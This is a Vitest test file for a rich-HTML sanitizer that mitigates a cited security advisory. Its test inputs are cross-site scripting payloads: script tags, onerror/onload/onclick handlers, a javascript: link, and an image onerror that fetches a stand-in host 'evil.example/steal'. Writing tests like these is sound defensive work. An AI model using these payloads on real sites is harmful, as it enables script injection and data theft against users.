import { describe, expect, it } from "vitest";

import { sanitizeRichHtml } from "@/lib/sanitize-rich-html";

describe("sanitizeRichHtml (GHSA-v3m3-f69x-jf25 mitigation)", () => {
  it("handles empty input safely", () => {
    expect(sanitizeRichHtml("")).toBe("");
    expect(sanitizeRichHtml(undefined as unknown as string)).toBe("");
  });

  it("strips <script> tags", () => {
    const dirty = "<p>hi</p><script>alert(1)</script>";
    const clean = sanitizeRichHtml(dirty);
    expect(clean).not.toMatch(/<script/i);
    expect(clean).toContain("<p>hi</p>");
  });

  it("removes inline event handlers (onerror/onload/onclick)", () => {
    const clean = sanitizeRichHtml(
      '<img src="https://example.com/a.png" onerror="alert(1)" />' +
        '<body onload="alert(2)"></body>' +
        '<a href="https://example.com" onclick="alert(3)">x</a>',
    );
    expect(clean).not.toMatch(/onerror=/i);
    expect(clean).not.toMatch(/onload=/i);
    expect(clean).not.toMatch(/onclick=/i);
  });

  it("removes javascript: URLs", () => {
    const clean = sanitizeRichHtml('<a href="javascript:alert(1)">x</a>');
    expect(clean).not.toMatch(/javascript:/i);
  });

  it("neutralises malicious image payloads", () => {
    const clean = sanitizeRichHtml(
      '<img src="x" onerror="fetch(\'https://evil.example/steal\')" />',
    );
    expect(clean).not.toMatch(/onerror/i);
    expect(clean).not.toMatch(/evil\.example/);
  });

  it("preserves safe headings, paragraphs, bold, italic, and lists", () => {
    const input =
      "<h2>Title</h2><p><strong>bold</strong> and <em>ital</em></p>" +
      "<ul><li>a</li><li>b</li></ul>";
    expect(sanitizeRichHtml(input)).toBe(input);
  });

  it("preserves HTTPS links, images, and videos with allowed attributes", () => {
    const clean = sanitizeRichHtml(
      '<a href="https://klinikawfa.com" target="_blank">go</a>' +
        '<img src="https://cdn.example/a.png" alt="a" />' +
        '<video controls src="https://cdn.example/v.mp4"></video>',
    );
    expect(clean).toContain('href="https://klinikawfa.com"');
    expect(clean).toContain('target="_blank"');
    expect(clean).toContain('<img src="https://cdn.example/a.png" alt="a">');
    expect(clean).toContain("<video");
    expect(clean).toContain("controls");
    expect(clean).toContain('src="https://cdn.example/v.mp4"');
  });

  it("is idempotent", () => {
    const input =
      '<p>hi <a href="https://x.example">x</a></p><script>bad()</script>';
    const once = sanitizeRichHtml(input);
    const twice = sanitizeRichHtml(once);
    expect(twice).toBe(once);
  });
});
